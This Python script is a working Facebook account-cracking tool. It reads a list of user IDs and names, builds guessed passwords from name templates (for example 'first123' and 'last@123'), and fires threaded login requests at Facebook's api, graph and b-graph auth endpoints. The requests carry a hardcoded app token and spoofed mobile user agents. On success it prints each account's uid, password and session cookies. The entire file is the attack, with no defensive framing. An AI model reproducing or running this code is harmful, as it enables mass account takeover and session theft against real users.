import os,json,time,uuid,sys,random,base64,shutil,re, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

line="—"*30
limit=50
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻  [Experiment]"""
def rn():
    pwx=['first123', 'first@123', 'first@12', '@first123', 'first1234', 'first12345', 'first last', 'first@1234', 'first12', 'first@', '@first@', 'firstlast', 'first123456', 'firstlast123', 'firstlast1234', 'last123', 'last@123', 'nepal123', 'first1']
    os.system("clear")
    print(logo)
    print(line)
    try:
        print(" Example /sdcard/id.txt")
        user=open(input(" file_path:"),"r").read().splitlines()
    except:
        rn()
    limit=len(user)
    print(line)
    
    with ThreadPool(max_workers=45) as heron:
        os.system("clear")
        print(logo)
        print(line)
        print("[1] Method API")
        print("[2] Method GRAPH")
        print("[3] Method B-GRAPH")
        print(line)
        me=input("_-")
        print(line)
        ua=input(" Inject Ua ~> ")
        os.system("clear")
        device=ua.split("FBBD/")[1].split(";")[0].upper()
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit)+"|Pas"+str(len(pwx)))
        print(" Ua Device ~> "+device)
        print(line)
        
        for xd in user:
            uid,names=xd.split("|")
            if me in ["1"]:
                heron.submit(test_1,uid,names,pwx,ua)
            elif me in ["2"]:
                heron.submit(test_2,uid,names,pwx,ua)
            else:
            
                heron.submit(test_3,uid,names,pwx,ua)


loop=0
oks=[]


def test_1(uid,names,pwx,ua):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-API\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            data={
            "locale":"en_US",
            "format":"json",
            "email": uid,
            "password":ps,
            "access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies":1}
            head={
            'Host': 'api.facebook.com',
            'user-agent': add_ua+ua,
            'content-type': 'application/json;charset=utf-8',
            'content-length': str(len(str(data))*3),
            'accept-encoding': 'gzip'}
            
            url= 'https://api.facebook.com/method/auth.login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                
                
                break
            
            else:
                continue
        loop+=1
        if limit<loop:
            sys.exit()
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_2(uid,names,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-GRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            
            
            data={
            "locale":"en_US",
            "format":"json",
            "email": uid,
            "password":ps,
            "access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies":1}
            head={
            'Host': 'graph.facebook.com',
            'user-agent': add_ua+ua,
            'content-type': 'application/json;charset=utf-8',
            'content-length': str(len(str(data))*3),
            'accept-encoding': 'gzip'}
            
            url=f'https://graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_3(uid,names,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-BGRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            token="350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi=str(uuid.uuid4())
            data={
            "locale":"en_US",
            "format":"json",
            "email": uid,
            "password":ps,
            "access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies":1}
            head={
            'Host': 'b-graph.facebook.com',
            'user-agent': add_ua+ua,
            'content-type': 'application/json;charset=utf-8',
            'content-length': str(len(str(data))*3),
            'accept-encoding': 'gzip'}
            url=f'https://b-graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)




rn()



